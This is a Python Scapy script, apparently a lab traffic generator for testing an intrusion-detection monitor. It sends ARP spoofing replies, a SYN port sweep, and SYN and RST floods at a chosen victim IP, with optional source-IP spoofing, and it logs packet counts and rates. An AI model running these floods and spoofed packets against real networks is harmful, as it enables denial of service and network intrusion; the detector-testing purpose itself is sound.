import argparse
import os
import random
import sys
import time

from scapy.all import ARP, Ether, IP, TCP, conf, get_if_addr, send, sendp

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
METRICS_FILE = 'data/metrics_log.txt'  # this is where the attack summary gets saved
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)


def _require_root() -> None:
    if os.name != "nt" and os.geteuid() != 0:
        raise SystemExit(
            "This script sends raw packets and typically requires root/admin.\n"
            "On macOS/Linux, run with sudo, e.g.:\n"
            "  sudo .venv/bin/python tools/live_attack.py --victim-ip <ip> --mode all\n"
        )


def _sleep_for_pps(pps: float | None) -> None:
    if pps and pps > 0:
        time.sleep(1.0 / pps)


def arp_inconsistency(attacker_ip: str, victim_ip: str, iface: str | None, pps: float | None, dry_run: bool) -> None:
    """
    Triggers ARP_SPOOF heuristic: same psrc IP observed with different hwsrc MACs (ARP replies).
    """
    macs = ["aa:aa:aa:aa:aa:aa", "bb:bb:bb:bb:bb:bb"]
    print("[*] ARP inconsistency bursts (ARP replies / op=2)...")
    for mac in macs:
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=attacker_ip, pdst=victim_ip, hwsrc=mac)
        if dry_run:
            print(f"    DRY-RUN would send: {pkt.summary()}")
        else:
            sendp(pkt, iface=iface, verbose=0)
        _sleep_for_pps(pps)


def syn_port_sweep(
    attacker_ip: str,
    victim_ip: str,
    iface: str | None,
    port_min: int,
    port_max: int,
    pps: float | None,
    dry_run: bool,
) -> None:
    """
    Triggers PORT_SCAN heuristic: many SYNs to distinct destination ports.
    """
    print(f"[*] SYN port sweep {port_min}-{port_max} (dst={victim_ip})...")
    base_sport = random.randint(30000, 60000)
    for i, dport in enumerate(range(port_min, port_max + 1)):
        pkt = IP(src=attacker_ip, dst=victim_ip) / TCP(sport=base_sport + i, dport=dport, flags="S")
        if dry_run:
            if i < 3 or i == (port_max - port_min):
                print(f"    DRY-RUN would send: {pkt.summary()}")
        else:
            send(pkt, iface=iface, verbose=0)
        _sleep_for_pps(pps)


def syn_flood(
    attacker_ip: str,
    victim_ip: str,
    iface: str | None,
    dport: int,
    count: int,
    pps: float | None,
    dry_run: bool,
) -> None:
    """
    Triggers SYN_FLOOD heuristic: burst SYNs to an auth-ish port.
    """
    print(f"[*] SYN flood -> {victim_ip}:{dport} x{count}...")
    base_sport = random.randint(30000, 60000)
    for i in range(count):
        pkt = IP(src=attacker_ip, dst=victim_ip) / TCP(sport=base_sport + i, dport=dport, flags="S")
        if dry_run:
            if i < 3 or i == count - 1:
                print(f"    DRY-RUN would send: {pkt.summary()}")
        else:
            send(pkt, iface=iface, verbose=0)
        _sleep_for_pps(pps)


def rst_flood(
    attacker_ip: str,
    victim_ip: str,
    iface: str | None,
    dport: int,
    count: int,
    pps: float | None,
    dry_run: bool,
) -> None:
    """
    Triggers RST_FLOOD heuristic (current code only flags RSTs to AUTH_PORTS).
    """
    print(f"[*] RST flood -> {victim_ip}:{dport} x{count}...")
    base_sport = random.randint(30000, 60000)
    for i in range(count):
        pkt = IP(src=attacker_ip, dst=victim_ip) / TCP(sport=base_sport + i, dport=dport, flags="R")
        if dry_run:
            if i < 3 or i == count - 1:
                print(f"    DRY-RUN would send: {pkt.summary()}")
        else:
            send(pkt, iface=iface, verbose=0)
        _sleep_for_pps(pps)


def main() -> None:
    attack_start = time.time()  # save the time before the attack starts
    # this marks where this test starts in the log file
    with open(METRICS_FILE, 'a') as file:  # open the summary log file
        file.write(f'\n===== TEST START =====\n')  # mark where this test starts

    parser = argparse.ArgumentParser(
        description=(
            "Lab-only traffic generator meant to be run alongside live monitoring (main.py).\n"
            "Only use on networks you own or have explicit permission to test."
        )
    )
    parser.add_argument(
        "--mode",
        choices=["arp", "portscan", "synflood", "rstflood", "all"],
        default="all",
        help="Which attack pattern to run",
    )
    parser.add_argument(
        "--victim-ip",
        required=True,
        help="Target IP on your LAN (often your router, a lab VM, or another device you control)",
    )
    parser.add_argument(
        "--spoof-src-ip",
        default=None,
        help=(
            "Optional source IP to embed in L3 packets (IP/TCP). "
            "If omitted, defaults to this machine's IPv4 on the chosen iface (recommended)."
        ),
    )
    parser.add_argument(
        "--iface",
        default=None,
        help="Interface to inject on (defaults to Scapy conf.iface, e.g. en0 on many Macs)",
    )
    parser.add_argument("--pps", type=float, default=2000.0, help="Packets per second throttle (0 = as fast as possible)")
    parser.add_argument("--dry-run", action="store_true", help="Print what would be sent, do not transmit packets")

    # portscan knobs
    parser.add_argument("--port-min", type=int, default=1)
    parser.add_argument("--port-max", type=int, default=120)

    # flood knobs
    parser.add_argument("--syn-dport", type=int, default=22)
    parser.add_argument("--syn-count", type=int, default=200)
    parser.add_argument("--rst-dport", type=int, default=22)
    parser.add_argument("--rst-count", type=int, default=200)

    args = parser.parse_args()
    total_packets = 0  # keep track of how many packets this attack sends

    if not args.dry_run:
        _require_root()

    iface = args.iface or conf.iface
    if iface is None and args.dry_run and args.spoof_src_ip:
        # Dry-run doesn't need a real injection iface; we only need a plausible src IP for summaries.
        iface = None
    elif iface is None:
        raise SystemExit("Could not determine a default interface. Pass --iface explicitly.")

    attacker_ip = args.spoof_src_ip
    if attacker_ip is None:
        if iface is None:
            raise SystemExit("Pass --spoof-src-ip (and/or --iface) so the script can pick a source IP.")
        attacker_ip = get_if_addr(iface)
        if not attacker_ip or attacker_ip == "0.0.0.0":
            raise SystemExit(
                f"Could not determine IPv4 address for iface {iface}. "
                "Pass --spoof-src-ip explicitly or fix interface selection."
            )

    pps = None if args.pps == 0 else args.pps

    print(f"[*] iface={iface} attacker_ip={attacker_ip} victim_ip={args.victim_ip} mode={args.mode} dry_run={args.dry_run}")

    if args.mode in ("arp", "all"):
        arp_inconsistency(attacker_ip, args.victim_ip, iface=iface, pps=pps, dry_run=args.dry_run)
        total_packets += 2  # two arp reply packets get sent here

    if args.mode in ("portscan", "all"):
        syn_port_sweep(
            attacker_ip,
            args.victim_ip,
            iface=iface,
            port_min=args.port_min,
            port_max=args.port_max,
            pps=pps,
            dry_run=args.dry_run,
        )
        total_packets += (args.port_max - args.port_min + 1)  # count how many ports we tried

    if args.mode in ("synflood", "all"):
        syn_flood(
            attacker_ip,
            args.victim_ip,
            iface=iface,
            dport=args.syn_dport,
            count=args.syn_count,
            pps=pps,
            dry_run=args.dry_run,
        )
        total_packets += args.syn_count  # count how many syn packets we sent

    if args.mode in ("rstflood", "all"):
        rst_flood(
            attacker_ip,
            args.victim_ip,
            iface=iface,
            dport=args.rst_dport,
            count=args.rst_count,
            pps=pps,
            dry_run=args.dry_run,
        )
        total_packets += args.rst_count  # count how many rst packets we sent

    attack_end = time.time()  # grab the time again when the attack is done
    attack_time = attack_end - attack_start  # this gives the full attack time

    if attack_time > 0:  # make sure we do not divide by zero
        packets_per_second = total_packets / attack_time  # quick packets per second number
    else:
        packets_per_second = 0  # fallback if something weird happens with the timer

    # this writes the attack info in one clean line
    with open(METRICS_FILE, 'a') as file:  # open the summary log file again to save this run
        file.write(f'ATTACK | Mode: {args.mode} | Victim: {args.victim_ip} | Packets: {total_packets} | Time: {attack_time:.2f}s | PPS: {packets_per_second:.2f}\n')  # save the attack results in one line
        file.write(f'===== TEST END =====\n\n')  # mark where this test ends

    print("[*] Done.")


if __name__ == "__main__":
    main()
